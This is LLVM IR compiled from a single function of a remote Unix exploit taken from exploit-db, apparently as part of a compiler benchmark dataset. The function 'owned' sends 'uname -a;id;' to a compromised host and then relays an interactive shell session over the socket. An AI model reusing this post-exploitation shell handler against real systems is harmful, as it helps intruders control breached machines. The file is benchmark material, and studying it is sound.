; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22469.c_owned.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22469.c_owned.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [14 x i8] c"uname -a;id;\0A\00", align 1
@FD_SETSIZE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [10 x i8] c" [-] cya\0A\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"[-] cya\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [16 x i8] c" [-] cya hax0r\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @owned(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca [1024 x i8], align 16
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0), i8** %5, align 8
  %7 = call i32 @FD_ZERO(i32* %3)
  %8 = load i32, i32* %2, align 4
  %9 = call i32 @FD_SET(i32 %8, i32* %3)
  %10 = call i32 @FD_SET(i32 0, i32* %3)
  %11 = load i32, i32* %2, align 4
  %12 = load i8*, i8** %5, align 8
  %13 = load i8*, i8** %5, align 8
  %14 = call i32 @strlen(i8* %13)
  %15 = call i64 @send(i32 %11, i8* %12, i32 %14, i32 0)
  br label %16

16:                                               ; preds = %59, %1
  %17 = load i32, i32* %2, align 4
  %18 = call i32 @FD_SET(i32 %17, i32* %3)
  %19 = call i32 @FD_SET(i32 0, i32* %3)
  %20 = load i32, i32* @FD_SETSIZE, align 4
  %21 = call i64 @select(i32 %20, i32* %3, i32* null, i32* null, i32* null)
  %22 = icmp slt i64 %21, 0
  br i1 %22, label %23, label %24

23:                                               ; preds = %16
  br label %61

24:                                               ; preds = %16
  %25 = load i32, i32* %2, align 4
  %26 = call i64 @FD_ISSET(i32 %25, i32* %3)
  %27 = icmp ne i64 %26, 0
  br i1 %27, label %28, label %42

28:                                               ; preds = %24
  %29 = load i32, i32* %2, align 4
  %30 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %31 = call i32 @recv(i32 %29, i8* %30, i32 1023, i32 0)
  store i32 %31, i32* %6, align 4
  %32 = icmp slt i32 %31, 0
  br i1 %32, label %33, label %35

33:                                               ; preds = %28
  %34 = call i32 @fatal(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0))
  br label %35

35:                                               ; preds = %33, %28
  %36 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %37 = load i32, i32* %6, align 4
  %38 = call i64 @write(i32 1, i8* %36, i32 %37)
  %39 = icmp slt i64 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %35
  br label %61

41:                                               ; preds = %35
  br label %42

42:                                               ; preds = %41, %24
  %43 = call i64 @FD_ISSET(i32 0, i32* %3)
  %44 = icmp ne i64 %43, 0
  br i1 %44, label %45, label %59

45:                                               ; preds = %42
  %46 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %47 = call i32 @read(i32 0, i8* %46, i32 1023)
  store i32 %47, i32* %6, align 4
  %48 = icmp slt i32 %47, 0
  br i1 %48, label %49, label %51

49:                                               ; preds = %45
  %50 = call i32 @fatal(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0))
  br label %51

51:                                               ; preds = %49, %45
  %52 = load i32, i32* %2, align 4
  %53 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %54 = load i32, i32* %6, align 4
  %55 = call i64 @send(i32 %52, i8* %53, i32 %54, i32 0)
  %56 = icmp slt i64 %55, 0
  br i1 %56, label %57, label %58

57:                                               ; preds = %51
  br label %61

58:                                               ; preds = %51
  br label %59

59:                                               ; preds = %58, %42
  %60 = call i32 @usleep(i32 10)
  br label %16

61:                                               ; preds = %57, %40, %23
  %62 = load i32, i32* @stderr, align 4
  %63 = call i32 @fprintf(i32 %62, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0))
  %64 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i64 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @fatal(i8*) #1

declare dso_local i64 @write(i32, i8*, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
